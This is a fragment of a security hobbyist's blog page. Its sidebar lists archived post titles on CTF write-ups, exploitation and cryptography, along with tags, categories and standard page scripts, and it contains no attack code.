+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-archive"> Total : 63 </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/10</span><a class="archive-post-title" href= "/2018/09/10/Python-Sandbox-Excape/" >Python Sandbox Excape</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/07</span><a class="archive-post-title" href= "/2018/09/07/noxCTF-2018-writeup/" >noxCTF-2018 writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/06</span><a class="archive-post-title" href= "/2018/09/06/python-Debug命令执行/" >python Debug命令执行</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/08</span><a class="archive-post-title" href= "/2018/08/08/xman2018/" >[Untitled Post]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/31</span><a class="archive-post-title" href= "/2018/07/31/Linux-learn/" >'Linux-learn'</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/27</span><a class="archive-post-title" href= "/2018/07/27/vulnhub-Bulldog/" >vulnhub-Bulldog</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/26</span><a class="archive-post-title" href= "/2018/07/26/vulnhub-Lazysysadmin/" >vulnhub-Lazysysadmin</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/26</span><a class="archive-post-title" href= "/2018/07/26/vulnhub-Freshly/" >vulnhub-Freshly</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/25</span><a class="archive-post-title" href= "/2018/07/25/vulnhub-FristiLeaks/" >vulnhub-FristiLeaks</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/26</span><a class="archive-post-title" href= "/2018/06/26/sql-blind-inject-summary/" >sql blind inject summary</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/25</span><a class="archive-post-title" href= "/2018/06/25/CTF随笔记/" >知识点随笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/24</span><a class="archive-post-title" href= "/2018/06/24/PHP-SSRF绕过tricks/" >PHP-SSRF绕过tricks</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span><a class="archive-post-title" href= "/2018/06/22/mysql-webshell/" >mysql->webshell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/20</span><a class="archive-post-title" href= "/2018/06/20/自己写得题目ORZ/" >自己写得题目ORZ</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/05</span><a class="archive-post-title" href= "/2018/06/05/cms-payload/" >cms-vul</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/31</span><a class="archive-post-title" href= "/2018/05/31/docker入门/" >docker入门</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/31</span><a class="archive-post-title" href= "/2018/05/31/Linux-Exploit之绕过ASLR-第三部分/" >Linux-Exploit之绕过ASLR-第三部分</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/30</span><a class="archive-post-title" href= "/2018/05/30/Linux-Exploit之使用链接的ret2libc绕过NX-bit/" >Linux-Exploit之使用链接的ret2libc绕过NX bit</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/27</span><a class="archive-post-title" href= "/2018/05/27/awd记录/" >记一次awd</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/24</span><a class="archive-post-title" href= "/2018/05/24/Linux-Exploit之绕过ASLR-第二部分/" >Linux-Exploit之绕过ASLR - 第二部分</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/24</span><a class="archive-post-title" href= "/2018/05/24/Linux-Exploit之绕过ASLR-第一部分/" >Linux-Exploit之绕过ASLR - 第一部分</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href= "/2018/05/22/Linux-Exploit之使用return-to-libc绕过NX-bit/" >Linux-Exploit之使用return-to-libc绕过NX bit</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href= "/2018/05/22/Linux-Exploit之Off-By-One-漏洞-基于栈/" >Linux-Exploit之Off-By-One 漏洞 (基于栈)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href= "/2018/05/22/Linux-Exploit之整数溢出/" >Linux-Exploit之整数溢出</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/18</span><a class="archive-post-title" href= "/2018/05/18/Linux-Exploit之典型的基于堆栈的缓冲区溢出/" >Linux-Exploit之典型的基于堆栈的缓冲区溢出</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/26</span><a class="archive-post-title" href= "/2018/04/26/PWN/" >PWN</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/23</span><a class="archive-post-title" href= "/2018/04/23/努力补坑中/" >努力补坑中</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/15</span><a class="archive-post-title" href= "/2018/04/15/root-me-App-Script/" >root-me App-Script</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/04</span><a class="archive-post-title" href= "/2018/04/04/root-me-web-client/" >root-me web-client</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/30</span><a class="archive-post-title" href= "/2018/03/30/root-me-web-server/" >root-me WEB-Server</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/15</span><a class="archive-post-title" href= "/2018/03/15/slove-me-wp/" >slove me wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/12</span><a class="archive-post-title" href= "/2018/03/12/matplotlib入门/" >matplotlib入门</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/11</span><a class="archive-post-title" href= "/2018/03/11/Python机器学习入门/" >Python机器学习入门</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/11</span><a class="archive-post-title" href= "/2018/03/11/numpy教程/" >numpy教程</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/08</span><a class="archive-post-title" href= "/2018/03/08/dedecms-v5-7缓存文件data-cache-typename-inc导致任意代码执行（需要管理员权限）/" >dedecms v5.7缓存文件data/cache/typename.inc导致任意代码执行（需要管理员权限）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/08</span><a class="archive-post-title" href= "/2018/03/08/Samba远程代码执行漏洞-CVE-2017-7494-复现/" >Samba远程代码执行漏洞(CVE-2017-7494)复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/11</span><a class="archive-post-title" href= "/2018/02/11/php使用参数化查询/" >php使用参数化查询</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/09</span><a class="archive-post-title" href= "/2018/02/09/RSA例题/" >RSA例题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/28</span><a class="archive-post-title" href= "/2018/01/28/php审计/" >php审计</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/21</span><a class="archive-post-title" href= "/2018/01/21/python微信跳一跳/" >python微信跳一跳</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/14</span><a class="archive-post-title" href= "/2018/01/14/Padding-Orlace/" >Padding Orlace</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/09</span><a class="archive-post-title" href= "/2018/01/09/记录一些思路脚本什么的/" >思路脚本代码什么的</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/05</span><a class="archive-post-title" href= "/2018/01/05/ECC计算公钥/" >ECC计算公钥</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/03</span><a class="archive-post-title" href= "/2018/01/03/hash扩展攻击/" >hash扩展攻击</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2017 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/30</span><a class="archive-post-title" href= "/2017/12/30/xss-payload/" >xss-payload</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/30</span><a class="archive-post-title" href= "/2017/12/30/CTF图像处理/" >CTF图像处理</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/28</span><a class="archive-post-title" href= "/2017/12/28/实验吧加了料的报错注入/" >实验吧加了料的报错注入</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/27</span><a class="archive-post-title" href= "/2017/12/27/我的pycharm突然没法使用requests了/" >关于一些乱七八糟的毛病</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/25</span><a class="archive-post-title" href= "/2017/12/25/Web-For-Pentester-に/" >Web For Pentester 2</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/24</span><a class="archive-post-title" href= "/2017/12/24/from-sqli-to-shell/" >from sqli to shell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/21</span><a class="archive-post-title" href= "/2017/12/21/Web-For-Pentester/" >Web For Pentester</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/15</span><a class="archive-post-title" href= "/2017/12/15/Python-DES/" >Python-DES</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/15</span><a class="archive-post-title" href= "/2017/12/15/Vigenere加解密and重合指数破解/" >Vigenere加解密and重合指数破解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/15</span><a class="archive-post-title" href= "/2017/12/15/仿射加密/" >仿射加密</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/15</span><a class="archive-post-title" href= "/2017/12/15/Python实现RC4及A5/" >Python实现RC4及A5</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/15</span><a class="archive-post-title" href= "/2017/12/15/Python实现AES/" >Python实现AES_128_CBC&OFB</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/15</span><a class="archive-post-title" href= "/2017/12/15/netcat/" >netcat</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/11</span><a class="archive-post-title" href= "/2017/12/11/南邮Reverse/" >南邮Reverse</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/11</span><a class="archive-post-title" href= "/2017/12/11/实验吧Reverse/" >实验吧Reverse</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/11</span><a class="archive-post-title" href= "/2017/12/11/Jarvis逆向/" >Jarvis逆向</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/27</span><a class="archive-post-title" href= "/2017/11/27/pyqt简单实例/" >pyqt简单实例</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/15</span><a class="archive-post-title" href= "/2017/11/15/README/" >welcome</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2016 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/01</span><a class="archive-post-title" href= "/2016/05/01/ISCC2018-WP/" >[Untitled Post]</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="图像处理"><span class="iconfont-archer">&#xe606;</span>图像处理</span>
+    
+        <span class="sidebar-tag-name" data-tags="笔记"><span class="iconfont-archer">&#xe606;</span>笔记</span>
+    
+        <span class="sidebar-tag-name" data-tags="ECC"><span class="iconfont-archer">&#xe606;</span>ECC</span>
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="Reverse"><span class="iconfont-archer">&#xe606;</span>Reverse</span>
+    
+        <span class="sidebar-tag-name" data-tags="PWN"><span class="iconfont-archer">&#xe606;</span>PWN</span>
+    
+        <span class="sidebar-tag-name" data-tags="Padding Orlace"><span class="iconfont-archer">&#xe606;</span>Padding Orlace</span>
+    
+        <span class="sidebar-tag-name" data-tags="DES"><span class="iconfont-archer">&#xe606;</span>DES</span>
+    
+        <span class="sidebar-tag-name" data-tags="AES"><span class="iconfont-archer">&#xe606;</span>AES</span>
+    
+        <span class="sidebar-tag-name" data-tags="RC4,A5"><span class="iconfont-archer">&#xe606;</span>RC4,A5</span>
+    
+        <span class="sidebar-tag-name" data-tags="机器学习"><span class="iconfont-archer">&#xe606;</span>机器学习</span>
+    
+        <span class="sidebar-tag-name" data-tags="hello"><span class="iconfont-archer">&#xe606;</span>hello</span>
+    
+        <span class="sidebar-tag-name" data-tags="Rsa"><span class="iconfont-archer">&#xe606;</span>Rsa</span>
+    
+        <span class="sidebar-tag-name" data-tags="漏洞复现"><span class="iconfont-archer">&#xe606;</span>漏洞复现</span>
+    
+        <span class="sidebar-tag-name" data-tags="Vigenere"><span class="iconfont-archer">&#xe606;</span>Vigenere</span>
+    
+        <span class="sidebar-tag-name" data-tags="Web"><span class="iconfont-archer">&#xe606;</span>Web</span>
+    
+        <span class="sidebar-tag-name" data-tags="人类观察"><span class="iconfont-archer">&#xe606;</span>人类观察</span>
+    
+        <span class="sidebar-tag-name" data-tags="docker"><span class="iconfont-archer">&#xe606;</span>docker</span>
+    
+        <span class="sidebar-tag-name" data-tags="hash扩展攻击"><span class="iconfont-archer">&#xe606;</span>hash扩展攻击</span>
+    
+        <span class="sidebar-tag-name" data-tags="matplotlib"><span class="iconfont-archer">&#xe606;</span>matplotlib</span>
+    
+        <span class="sidebar-tag-name" data-tags="Python"><span class="iconfont-archer">&#xe606;</span>Python</span>
+    
+        <span class="sidebar-tag-name" data-tags="菜猫的无能狂怒"><span class="iconfont-archer">&#xe606;</span>菜猫的无能狂怒</span>
+    
+        <span class="sidebar-tag-name" data-tags="numpy"><span class="iconfont-archer">&#xe606;</span>numpy</span>
+    
+        <span class="sidebar-tag-name" data-tags="php审计"><span class="iconfont-archer">&#xe606;</span>php审计</span>
+    
+        <span class="sidebar-tag-name" data-tags="root-me"><span class="iconfont-archer">&#xe606;</span>root-me</span>
+    
+        <span class="sidebar-tag-name" data-tags="sqli"><span class="iconfont-archer">&#xe606;</span>sqli</span>
+    
+        <span class="sidebar-tag-name" data-tags="vulnhub"><span class="iconfont-archer">&#xe606;</span>vulnhub</span>
+    
+        <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
+    
+        <span class="sidebar-tag-name" data-tags="仿射加密"><span class="iconfont-archer">&#xe606;</span>仿射加密</span>
+    
+        <span class="sidebar-tag-name" data-tags="无产阶级之怒"><span class="iconfont-archer">&#xe606;</span>无产阶级之怒</span>
+    
+        <span class="sidebar-tag-name" data-tags="记录一些思路脚本什么的"><span class="iconfont-archer">&#xe606;</span>记录一些思路脚本什么的</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="图像处理"><span class="iconfont-archer">&#xe60a;</span>图像处理</span>
+    
+        <span class="sidebar-category-name" data-categories="笔记"><span class="iconfont-archer">&#xe60a;</span>笔记</span>
+    
+        <span class="sidebar-category-name" data-categories="Crypto"><span class="iconfont-archer">&#xe60a;</span>Crypto</span>
+    
+        <span class="sidebar-category-name" data-categories="writeup"><span class="iconfont-archer">&#xe60a;</span>writeup</span>
+    
+        <span class="sidebar-category-name" data-categories="Writeup"><span class="iconfont-archer">&#xe60a;</span>Writeup</span>
+    
+        <span class="sidebar-category-name" data-categories="PWN"><span class="iconfont-archer">&#xe60a;</span>PWN</span>
+    
+        <span class="sidebar-category-name" data-categories="机器学习"><span class="iconfont-archer">&#xe60a;</span>机器学习</span>
+    
+        <span class="sidebar-category-name" data-categories="Writeup/Crypto"><span class="iconfont-archer">&#xe60a;</span>Writeup/Crypto</span>
+    
+        <span class="sidebar-category-name" data-categories="漏洞复现"><span class="iconfont-archer">&#xe60a;</span>漏洞复现</span>
+    
+        <span class="sidebar-category-name" data-categories="docker"><span class="iconfont-archer">&#xe60a;</span>docker</span>
+    
+        <span class="sidebar-category-name" data-categories="Web"><span class="iconfont-archer">&#xe60a;</span>Web</span>
+    
+        <span class="sidebar-category-name" data-categories="matplotlib"><span class="iconfont-archer">&#xe60a;</span>matplotlib</span>
+    
+        <span class="sidebar-category-name" data-categories="Python"><span class="iconfont-archer">&#xe60a;</span>Python</span>
+    
+        <span class="sidebar-category-name" data-categories="numpy"><span class="iconfont-archer">&#xe60a;</span>numpy</span>
+    
+        <span class="sidebar-category-name" data-categories="Web/笔记"><span class="iconfont-archer">&#xe60a;</span>Web/笔记</span>
+    
+        <span class="sidebar-category-name" data-categories="记录一些思路脚本什么的"><span class="iconfont-archer">&#xe60a;</span>记录一些思路脚本什么的</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: '/',
+        author: 'n3k0'
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- busuanzi  -->
+    
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+    
+    </body>
+</html>
+
+
